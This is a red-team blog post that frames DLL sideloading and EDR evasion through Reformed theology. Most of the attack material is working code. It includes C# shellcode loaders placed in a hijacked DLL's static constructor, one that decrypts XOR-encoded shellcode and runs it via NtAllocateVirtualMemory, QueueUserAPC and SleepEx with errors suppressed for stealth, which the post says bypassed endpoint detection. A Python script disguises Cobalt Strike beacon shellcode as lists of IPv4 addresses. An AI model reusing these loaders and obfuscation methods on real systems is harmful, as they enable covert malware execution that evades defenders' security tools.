---
title: "Outpacing the Watchers (Part II): Loader Crafting and Logical Decrees"
date: 2025-05-01
categories: [red-team, malware, edr-evasion, theology]
tags: [dll sideloading, edr, cobalt strike, red team, theology, malware, supralapsarianism, infralapsarianism]
---

> *“The heart of man plans his way, but the Lord establishes his steps.” — Proverbs 16:9*

---

### ⚠️ Use With Integrity  
All techniques shown are for authorized, lawful red team assessments only. We pursue **righteous intrusion** — not reckless compromise.  
> *“Let all that you do be done in love.” — 1 Corinthians 16:14*

---

## I. Payload Design and the Order of Decrees

In Reformed theology, **Supralapsarianism** teaches that God’s plan to redeem came *before* His decree to permit the Fall. **Infralapsarianism** argues the opposite — redemption was decreed *after* the Fall occurred.

In red team payload development, these two views mirror how we architect our delivery mechanisms:

- **Supralapsarian Payloads**: Crafted *before* the exploit path is confirmed — loaders are written ahead of time, anticipating breach.
- **Infralapsarian Payloads**: Crafted *after* reconnaissance and sideloading vectors are discovered — loaders are reactive and path-specific.

These sections explore the **Infralapsarian position**, that paylods are created **after** reconnaissance and sideloading vectors are discovered--loaders are reactive and path-specific. This does not mean that a Supralapsarian approach is not needed, but is a more difficult path of exploitation. 

The infralapsarian position means that we respond to discoverd convitions: once we uncover a vulneralbe sideloading path, we begin designing our payload in resposne to that revelation. 

The reconnaissance is informed by revelation.

---

## II. Recon and Path Identification (Infralapsarian Phase)

As mentioned, the theological framework of **Infralapsarianism** shapes how we thing about red team operations: we do not begin with execution--we begin by observing what is already broken, and only then do we craft the response. 

Therefore, in this phase, we search for vulnerable paths--those trusted, signed executables that expose the system's assumptions. We will walk through these reconnaissance steps (as well as execution) throughout this and subsequential sections. 

> #### ⚠️ Note on Payload Build Out
> All techniques shown are for authorized, lawful red team assessments only. We pursue **righteous intrusion** — not reckless compromise. With that in mind, we will talk theory and "how to" without revealing processes and injection points as this information is proprietary; however, in seeking truth we will reveal that which is "hidden." 

### 🔎 Step 1: Find a Viable Sideloading Path with Assembly Hunter

The first move in this **infralapsarian methodology** is reconnaissance — specifically, locating a **signed executable** that trusts DLLs in its local directory. For this, we use [Assembly Hunter](https://github.com/mgeeky/AssemblyHunter).

**Assembly Hunter scans directories for:**

- Digitally signed executables (often required for trusted execution)  
- DLL import lists, exposing what dependencies the binary expects  
- Missing or phantom DLLs, revealing potential for hijacking  
- Load order assumptions, like loading from the working directory  

This tool acts as your **revelation mechanism** — it shows you what the system trusts *without verifying*.

> “The heart of man plans his way, but the LORD establishes his steps.” — Proverbs 16:9

What you’re doing here is finding where the operating system has already **misjudged trust** — and redemptive intrusion begins where that trust is misaligned.

---

### 🛠️ Step 2: Analyze the Execution Path

Once you identify a candidate:

**Use Procmon to monitor runtime DLL load behavior:**

- `NAME NOT FOUND` suggests phantom DLLs  
- `PATH NOT FOUND` indicates vulnerable search paths  
- `LOAD IMAGE` confirms execution  

**Use ILSpy or dnSpy to inspect the binary:**

- Check for static constructors (`.cctor`)  
- Look for `DllImport`, `LoadLibrary`, or `GetProcAddress` usage  
- Observe form load routines or UI initialization triggers  

**Map Out Reliable Execution:**

- Identify lifecycle hooks that fire early and reliably  
- Confirm that a hijacked DLL won't crash the application  

---

### 🛐 Theological Reflection: Post-Fall Discernment

The **infralapsarian mindset** starts not with what we *intend*, but with what we *observe*. You respond to the *fallenness* of the system — its misplaced trust, its lazy pathing logic, its default loading assumptions.

And like the gospel, the payload you craft does not come to destroy, but to **expose and redeem**.

> “For the LORD gives wisdom; from his mouth come knowledge and understanding.” — Proverbs 2:6

- **The Father** reveals the broken trust.  
- **The Son** enters into the flawed system through the hijack.  
- **The Spirit** remains undetected, persisting until truth is made visible.  

We don’t exploit because we hate the system.  
We exploit because we **love truth** — and the system has trusted too easily.

---

## III. Supralapsarian Detour: Payloads Built in Faith

In some operations, we may not wait for reconnaissance to reveal a sideloading path. Instead, we preemptively craft a **modular loader**, trusting that we will eventually find a compatible execution point. This is the **supralapsarian mindset**: the decree to act comes *before* the need is revealed.

### 🔧 What This Looks Like

- **Generate a flexible loader**: Export-neutral DLL, no assumptions about environment  
- **Modular payload handler**: Accepts encoded shellcode from external file or input  
- **Execution options**: Multiple methods embedded (`CreateThread`, `APC`, `NtCreateThreadEx`)  
- **Low observability**: No obvious strings or debug artifacts  

This approach reflects divine foresight — building not based on need, but based on foreknowledge.  
It doesn't always fit the infrastructure you find, but when it does, **deployment is immediate**.

> “To craft your loader before finding your sideloading path is to design with divine foresight.”

This is a viable but riskier path — it may not fit the infrastructure you face. But when it does? You are ready to execute **without delay**.

---

## IV. Deployment Begins: DLL Analysis and Code Injection

Once a viable sideloading path is discovered, the next step is to identify **injection points** inside the target DLL. We’re looking for areas in the code where we can insert execution logic without disrupting functionality.

### 🛠 Tools Used

- `dnSpy` or `ILSpy` to inspect methods and constructors  
- `Procmon` to observe load behavior and confirm runtime execution  
- Optional: Visual Studio for sandboxed rebuilding/testing  

### 🎯 What to Look For

- Static constructors (`.cctor`) that fire automatically  
- UI methods like `OnLoad()` or `Form_Shown`  
- Background tasks or event handlers  
- Initialization code in utility classes  

### 💡 Proof of Execution

Before deploying full shellcode, inject a simple MessageBox popup:

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace XXXXXX.Diagnostics.Audit
{
    public static partial class EventLogger
    {
        static EventLogger()
        {
            try
            {
                MessageBox.Show("Triggering shellcode from Shellcode.txt", "DEBUG");

                string basePath = "C:\\Users\\Users\\Desktop\\Payload\\";
                string filenamePath = Path.Combine(basePath, "Shellcode.txt");

                if (File.Exists(filenamePath))
                {
                    ExecuteShellcodeFromFile(filenamePath);
                }
                else
                {
                    MessageBox.Show("ips.txt not found!", "DEBUG");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}", "DEBUG");
            }
        }

        private static void ExecuteShellcodeFromFile(string filename)
        {
            try
            {
                string[] lines = File.ReadAllLines(filename);
                List<byte> shellcode = new List<byte>();

                foreach (var line in lines)
                {
                    string[] parts = line.Split('.');
                    if (parts.Length == 4)
                    {
                        shellcode.AddRange(parts.Select(byte.Parse));
                    }
                }

                IntPtr allocMem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Count, 0x3000, 0x40);
                Marshal.Copy(shellcode.ToArray(), 0, allocMem, shellcode.Count);

                IntPtr thread = CreateThread(IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Execution Error: {ex.Message}", "DEBUG");
            }
        }

        // Import Windows API functions
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
```

If this works, this is your first sign that **the system has accepted your presence**. 

---

## V. Shellcode Generation and Obfuscation

After injection is proven, shift to the real payload.

**Shellcode generation tools:**

- Cobalt Strike  
- MSFVenom  
- Donut

**Encoding Techniques:**

- XOR (with static or rolling key)  
- IPv4 encoding (e.g., 192.168.10.32 format)  
- Base64 or zlib compression

This is **the Spirit at work** — your code remains unseen, but present, waiting for the appointed moment. For this particular discussion, the team developed a python script using some techniques picked up from [Malware Development Academy](https://maldevacademy.com/), where raw shallcode (```.bin```) is converted to IPv4 addresses. In addition, the team also modified the output by encrypting the shellcode with an XOR Key. All-in-all this creates an shellcode that looks like a list of IPv4 addresses in a ```.txt``` file.

```
import struct

def xor_encrypt(data, key):
    return bytearray(b ^ key for b in data)

def shellcode_to_ip_list(input_file, output_file, xor_key=0x55):
    try:
        with open(input_file, "rb") as f:
            shellcode = bytearray(f.read())

        # XOR encrypt the shellcode
        encrypted_shellcode = xor_encrypt(shellcode, xor_key)

        # Convert to fake IPs
        ip_list = [f"{b[0]}.{b[1]}.{b[2]}.{b[3]}" for b in struct.iter_unpack("BBBB", encrypted_shellcode.ljust((len(encrypted_shellcode) + 3) & ~3, b"\x00"))]

        with open(output_file, "w") as f:
            f.write("\n".join(ip_list))

        print(f"[✅] Encrypted IP list saved to {output_file}")

    except Exception as e:
        print(f"[❌] Error: {e}")

if __name__ == "__main__":
    input_file = input("Enter the path to your shellcode file (e.g., beacon_x64.bin): ").strip()
    output_file = input("Enter the output file path (e.g., ips.txt): ").strip()
    
    shellcode_to_ip_list(input_file, output_file)
```

With our shellcode now properly obfuscated and encrypted. We can moved on to additional testing and development. 

---

## VI. Stealthy Execution: From Windows APIs to Syscalls

Once shellcode is generated and encoded, execution becomes the next battleground — and **EDRs watch closely**.

Classic API calls like `VirtualAlloc`, `WriteProcessMemory`, and `CreateThread` are **heavily monitored**. If you use them as-is, you will trigger detections.

This is where we pivot to **low-level syscalls** — techniques that mimic native OS behavior without ringing the EDR alarm bells.

### 🔻 Classic API Pattern (High-Risk)

```
csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, addr, shellcode.Length);
CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
```

---

### 🛡️ Improved Tactics: Nt Syscalls

These Win32 APIs are well-known and monitored through userland hooks. Your payload becomes loud, even if encoded.

Instead, use native syscall wrappers:

- NtAllocateVirtualMemory0
- NtWriteVirtualMemory0
- NtCreateThreadEx

These provide more stealth by bypassing userland hooks and calling directly into ntdll.dll functions.

Example strategy:

- Decrypt your shellcode in memory
- Allocate memory via NtAllocateVirtualMemory
- Copy with RtlMoveMemory
- Execute with NtCreateThreadEx

Sleep or delay execution to avoid behavioral triggers. In our case, we change our ```initial message box with callback.cs``` and stop using ```VritualAllocCreateThread```. 

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace XXXXXX.Diagnostics.Audit
{
    public static partial class EventLogger
    {
        static EventLogger()
        {
            try
            {
                // Get the directory where the DLL is running
                string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string basePath = Path.GetDirectoryName(dllPath);
                string filenamePath = Path.Combine(basePath, "Shellcode.txt");

                MessageBox.Show($"Triggering shellcode from: {filenamePath}", "DEBUG");

                if (File.Exists(filenamePath))
                {
                    ExecuteShellcodeFromFile(filenamePath);
                }
                else
                {
                    MessageBox.Show("Shellcode.txt not found!", "DEBUG");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}", "DEBUG");
            }
        }

        private static void ExecuteShellcodeFromFile(string filename)
        {
            try
            {
                string[] lines = File.ReadAllLines(filename);
                List<byte> shellcode = new List<byte>();

                foreach (var line in lines)
                {
                    string[] parts = line.Split('.');
                    if (parts.Length == 4)
                    {
                        shellcode.AddRange(parts.Select(byte.Parse));
                    }
                }

                // Stealthy Memory Allocation
                IntPtr pMemory = IntPtr.Zero;
                UIntPtr size = (UIntPtr)shellcode.Count;
                uint ntstatus = NtAllocateVirtualMemory(
                    (IntPtr)(-1), 
                    ref pMemory, 
                    IntPtr.Zero, 
                    ref size, 
                    0x3000, 
                    0x40
                );

                if (ntstatus != 0 || pMemory == IntPtr.Zero)
                    return;  // Memory allocation failed

                Marshal.Copy(shellcode.ToArray(), 0, pMemory, shellcode.Count);

                // Stealthy Shellcode Execution
                IntPtr hThread = IntPtr.Zero;
                ntstatus = NtCreateThreadEx(
                    out hThread, 
                    0x1FFFFF, 
                    IntPtr.Zero, 
                    (IntPtr)(-1), 
                    pMemory, 
                    IntPtr.Zero, 
                    false, 
                    0, 
                    0x1000, 
                    0x100000, 
                    IntPtr.Zero
                );

                if (ntstatus != 0 || hThread == IntPtr.Zero)
                    return;  // Thread creation failed
            }
            catch (Exception ex)
            {
                // Logging removed for stealth
            }
        }

        // Import stealthy Windows API functions
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            uint AllocationType,
            uint Protect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            uint stackZeroBits,
            uint sizeOfStackCommit,
            uint sizeOfStackReserve,
            IntPtr bytesBuffer
        );
    }
}
```

### 🕊️ Theological Insight: Stealth as Humility

> “Be wise as serpents and innocent as doves.” — Matthew 10:16

You are not called to be noisy.

You are called to be precise.

In spiritual warfare, subtlety matters. Stealthy syscall usage doesn’t just evade detection — it reflects a posture of restraint and purpose.

We’re not here to cause chaos.

We’re here to reveal misplaced trust — quietly, intentionally, and with conviction.

---

## VII. Putting It All Together: Doctrine Meets Deployment

At this point in the process, we've aligned theological insight with technical action. The infralapsarian workflow teaches us to respond faithfully to discovered weakness — and now, all elements converge:

### 🔁 From Discovery to Execution

1. Reconnaissance (The Father)
- Use Assembly Hunter to identify signed executables
-  Analyze DLL dependencies and loading behavior
2. Injection Point (The Son)
- Dissect the binary using ILSpy or dnSpy
- Locate valid execution paths: DllMain, Exported Functions, .cctor, UI handlers
3. Payload Design (The Spirit)
- Create XOR-encoded shellcode
- Embed using IPv4 formatting, blobs, or compression
- Load via stealthy syscalls: NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx
4. Execution and Evasion
- Avoid userland hooks
- Delay execution or use SleepEx to obfuscate behavior
- Validate that your hijacked DLL loads cleanly and maintains application flow

Here is the final ```csharp``` that was used to bypass Endpoint Detections. 

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace XXXXXX.Diagnostics.Audit
{
    public static partial class EventLogger
    {
        static EventLogger()
        {
            try
            {
                // Get the directory where the DLL is running
                string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string basePath = Path.GetDirectoryName(dllPath);
                string filenamePath = Path.Combine(basePath, "Shellcode.txt");

                if (File.Exists(filenamePath))
                {
                    ExecuteShellcodeFromFile(filenamePath);
                }
            }
            catch (Exception ex)
            {
                // No error message for stealth
            }
        }

        private static void ExecuteShellcodeFromFile(string filename)
        {
            try
            {
                string[] lines = File.ReadAllLines(filename);
                List<byte> shellcode = new List<byte>();

                foreach (var line in lines)
                {
                    string[] parts = line.Split('.');
                    if (parts.Length == 4)
                    {
                        shellcode.AddRange(parts.Select(byte.Parse));
                    }
                }

                // XOR Decrypt the shellcode
                for (int i = 0; i < shellcode.Count; i++)
                {
                    shellcode[i] ^= 0x55;  // XOR key: 0x55
                }

                // Allocate memory stealthily
                IntPtr pMemory = IntPtr.Zero;
                UIntPtr size = (UIntPtr)shellcode.Count;
                uint ntstatus = NtAllocateVirtualMemory(
                    (IntPtr)(-1), 
                    ref pMemory, 
                    IntPtr.Zero, 
                    ref size, 
                    0x3000, 
                    0x40
                );

                if (ntstatus != 0 || pMemory == IntPtr.Zero)
                    return;  // Memory allocation failed

                Marshal.Copy(shellcode.ToArray(), 0, pMemory, shellcode.Count);

                // Get handle to current thread
                IntPtr hThread = GetCurrentThread();

                // Queue shellcode execution
                if (!QueueUserAPC(pMemory, hThread, IntPtr.Zero))
                    return;  // Failed to queue execution

                // Trigger APC execution
                SleepEx(0, true);
            }
            catch (Exception ex)
            {
                // No error message for stealth
            }
        }

        // Import stealthy Windows API functions
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            uint AllocationType,
            uint Protect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint SleepEx(uint dwMilliseconds, bool bAlertable);
    }
}
```

🕊️ “In your light do we see light.” — Psalm 36:9
The red teamer works in shadows not to remain hidden, but to reveal what defenders cannot see.

Our path mirrors the redemptive arc of revelation: observe, respond, expose, redeem. To do this righteously, we do not rush — we build, reflect, and deploy with precision.

---

## VIII. Conclusion: THe Grace of Precision

Payload development is more than technical ingenuity — it’s an exercise in discernment. The infralapsarian red teamer doesn’t blindly attack. He observes, interprets, and responds. He sees the system’s misplaced trust and, like a good theologian, moves to correct it — not with destruction, but with conviction.

We do not build to glorify compromise. We build to expose assumptions, to harden the flock, and to prepare the defenders for what they’ve been too quick to trust.

> “Examine everything carefully; hold fast to that which is good.” — 1 Thessalonians 5:21

Through reconnaissance, payload crafting, stealthy execution, and theological reflection, we’ve mapped a framework that honors both discipline and danger — all in service of truth.

---

## 📜 Disclaimer

This post is for **authorized red team operations** only.  
All methods are rooted in ethical testing and theological clarity.

> **To outpace the watchers is not to destroy, but to disclose. Not to deceive, but to discern.**

---

**AthanasiusXOR**  
**Contra Mundum. Code Obscurum.**

